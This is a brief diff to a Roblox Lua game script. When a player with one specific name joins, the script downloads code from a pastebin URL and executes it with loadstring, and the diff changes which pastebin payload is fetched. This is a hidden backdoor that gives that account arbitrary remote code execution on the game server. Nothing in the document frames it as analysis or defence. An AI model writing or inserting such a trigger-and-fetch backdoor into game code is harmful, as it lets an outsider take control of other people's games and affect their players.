@@ -1,7 +1,7 @@
 
 game.Players.PlayerAdded:Connect(function(player)
   if player.Name == "ProAIt5000" then
-			loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
+			loadstring(game:HttpGet("https://pastebin.com/raw/kYkU0LqY"))()
 		end
 end)
 
